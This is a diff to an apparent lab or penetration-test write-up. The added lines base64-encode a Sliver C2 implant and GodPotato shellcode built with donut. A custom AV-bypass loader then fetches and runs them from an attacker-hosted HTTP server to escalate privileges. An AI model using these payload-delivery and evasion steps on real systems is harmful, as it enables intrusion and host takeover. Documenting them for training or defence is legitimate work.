@@ -967,7 +967,11 @@ city\web_admin
 
 ## 9.2 Sliver C2 Session as sam.brooks
 
-A custom Go-based AV bypass loader (`runner.exe`) was compiled and uploaded to obtain a Sliver C2 session via mTLS. This provides a more flexible shell than Evil-WinRM for further exploitation.
+A custom Go-based AV bypass loader (`runner.exe`) was compiled and uploaded to obtain a Sliver C2 session via mTLS. This provides a more flexible shell than Evil-WinRM for further exploitation. The Sliver mTLS implant shellcode was base64-encoded for delivery via the runner's remote loading capability:
+
+```bash
+base64 -w0 implant.bin > implant.enc
+```
 
 ```
 *Evil-WinRM* PS C:\Users\sam.brooks\Documents> upload runner.exe
@@ -1094,7 +1098,13 @@ GodPotato was used to abuse `SeImpersonatePrivilege` and execute the Sliver impl
 donut -i /workspace/gp.exe -a 2 -b 2 -p '-cmd "c:\tools\runner.exe -remote http://10.200.38.219:8000/implant.enc"' -o /workspace/gp.bin
 ```
 
-The shellcode was loaded and executed on the target:
+The resulting shellcode was then base64-encoded for remote delivery:
+
+```bash
+base64 -w0 gp.bin > gp.enc
+```
+
+The encoded payload was hosted and executed on the target:
 
 ```
 PS C:\tools> .\runner.exe -remote http://10.200.38.219:8000/gp.enc
